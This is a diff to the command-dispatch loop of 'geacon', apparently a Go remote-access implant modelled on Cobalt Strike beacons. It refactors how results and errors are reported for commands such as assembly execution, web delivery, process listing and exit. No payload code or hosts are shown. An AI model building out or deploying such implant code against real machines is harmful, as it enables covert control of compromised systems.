@@ -95,7 +95,7 @@ func main() {
 							case command.CMD_TYPE_EXEC_ASM_IGNORE_TOKEN_X64:
 								execErr = command.ExecAsm(cmdBuf, true, true)
 							case command.CMD_TYPE_UNKNOWN_JOB:
-								// seems same as 40, to be done
+								// seems same as 40, need to check.
 								fallthrough
 							case command.CMD_TYPE_JOB:
 								execErr = command.HandlerJobAsync(cmdBuf)
@@ -108,8 +108,7 @@ func main() {
 							case command.CMD_TYPE_WEB_DELIVERY:
 								command.WebDelivery(cmdBuf)
 							case command.CMD_TYPE_GET_UID:
-								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, []byte(sysinfo.GetUsername()))
-								packet.PushResult(finalPacket)
+								packet.PushResult(command.CALLBACK_OUTPUT, []byte(sysinfo.GetUsername()))
 							// even there is a CALLBACK_PROCESS_LIST, but still use PENDING
 							case command.CMD_TYPE_PS:
 								execErr = command.ListProcess(cmdBuf)
@@ -142,15 +141,14 @@ func main() {
 							case command.CMD_TYPE_LIST_NETWORK:
 								execErr = command.GetNetworkInformation(cmdBuf)
 							case command.CMD_TYPE_EXIT:
-								finPacket := packet.MakePacket(command.CALLBACK_DEAD, []byte("exit"))
-								packet.PushResult(finPacket)
+								packet.PushResult(command.CALLBACK_DEAD, []byte("exit"))
 								os.Exit(0)
 							default:
 								errMsg := fmt.Sprintf("command type %d is not support by geacon now\n", cmdType)
-								command.ErrorMessage(errMsg)
+								packet.ErrorMessage(errMsg)
 							}
 							if execErr != nil {
-								command.ErrorMessage(execErr.Error())
+								packet.ErrorMessage(execErr.Error())
 							}
 						}
 					}
